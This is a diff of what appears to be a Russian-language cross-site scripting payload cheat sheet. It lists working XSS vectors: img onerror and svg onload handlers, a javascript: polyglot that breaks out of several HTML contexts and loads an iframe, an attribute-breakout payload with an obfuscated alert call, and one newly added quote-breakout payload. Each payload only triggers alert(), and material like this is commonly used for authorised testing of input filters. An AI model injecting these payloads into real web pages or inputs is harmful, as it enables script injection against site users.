@@ -23,7 +23,7 @@ eval('alert(9)')
 <img src onerror=alert(0)>
 
 
-<svg/onload=%26nbsp;alert`loool`+
+<svg/onload=%26nbsp;alert`1`+
 ```
 ---
 Основные методы вызова js из html
@@ -48,6 +48,8 @@ alert(location.origin)
 ${alert}
 ────────────────────────────────────────────
 jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
+────────────────────────────────────────────
+'),alert()//"><img src=x onerror=alert()>
 ────────────────────────────────────────────
 1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
 ────────────────────────────────────────────
